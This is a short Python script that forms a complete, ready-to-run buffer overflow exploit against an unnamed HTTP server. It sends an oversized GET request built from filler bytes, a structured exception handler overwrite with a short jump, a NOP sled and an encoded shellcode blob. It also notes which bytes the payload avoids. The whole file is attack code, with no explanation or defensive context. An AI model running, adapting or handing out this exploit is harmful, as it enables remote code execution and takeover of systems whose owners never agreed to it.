import socket
import sys

host = str(sys.argv[1])
port = int(sys.argv[2])

ip = sys.argv[1]

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((ip,port))


bad = "A"*4061 
nseh = "\xeb\x06\x90\x90" #NSEH
seh =   "\xfe\x03\x01\x10" #SEH 0x100103fe
nops = "\x90"*475
shellcode = ("\xda\xcc\xbf\x49\xec\xba\xbb\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x31\x83\xc2\x04\x31\x7a\x14\x03\x7a\x5d\x0e\x4f\x47\xb5\x4c"
"\xb0\xb8\x45\x31\x38\x5d\x74\x71\x5e\x15\x26\x41\x14\x7b\xca"
"\x2a\x78\x68\x59\x5e\x55\x9f\xea\xd5\x83\xae\xeb\x46\xf7\xb1"
"\x6f\x95\x24\x12\x4e\x56\x39\x53\x97\x8b\xb0\x01\x40\xc7\x67"
"\xb6\xe5\x9d\xbb\x3d\xb5\x30\xbc\xa2\x0d\x32\xed\x74\x06\x6d"
"\x2d\x76\xcb\x05\x64\x60\x08\x23\x3e\x1b\xfa\xdf\xc1\xcd\x33"
"\x1f\x6d\x30\xfc\xd2\x6f\x74\x3a\x0d\x1a\x8c\x39\xb0\x1d\x4b"
"\x40\x6e\xab\x48\xe2\xe5\x0b\xb5\x13\x29\xcd\x3e\x1f\x86\x99"
"\x19\x03\x19\x4d\x12\x3f\x92\x70\xf5\xb6\xe0\x56\xd1\x93\xb3"
"\xf7\x40\x79\x15\x07\x92\x22\xca\xad\xd8\xce\x1f\xdc\x82\x84"
"\xde\x52\xb9\xea\xe1\x6c\xc2\x5a\x8a\x5d\x49\x35\xcd\x61\x98"
"\x72\x21\x28\x81\xd2\xaa\xf5\x53\x67\xb7\x05\x8e\xab\xce\x85"
"\x3b\x53\x35\x95\x49\x56\x71\x11\xa1\x2a\xea\xf4\xc5\x99\x0b"
"\xdd\xa5\x7c\x98\xbd\x07\x1b\x18\x27\x58")
# Bad chars = \x00\x20\x25\x2b\x2f
socket.send("GET " + bad + nseh + seh + nops + shellcode +" HTTP/1.0\r\n\r\n")

socket.close()
